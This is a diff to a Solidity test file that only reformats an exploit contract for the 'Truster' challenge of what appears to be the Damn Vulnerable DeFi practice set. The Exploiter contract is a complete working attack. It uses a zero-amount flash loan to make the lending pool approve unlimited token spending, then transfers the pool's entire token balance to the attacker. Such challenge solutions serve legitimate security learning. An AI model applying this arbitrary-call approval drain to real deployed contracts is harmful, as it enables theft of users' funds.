@@ -58,20 +58,12 @@ contract Truster is Test {
 }
 
 contract Exploiter {
-    constructor(
-        TrusterLenderPool pool,
-        DamnValuableToken dvt,
-        address attacker
-    ) {
+    constructor(TrusterLenderPool pool, DamnValuableToken dvt, address attacker) {
         pool.flashLoan(
             0,
             address(69),
             address(dvt),
-            abi.encodeWithSignature(
-                "approve(address,uint256)",
-                address(this),
-                type(uint256).max
-            )
+            abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max)
         );
         uint256 extractableBalance = dvt.balanceOf(address(pool));
         dvt.transferFrom(address(pool), attacker, extractableBalance);
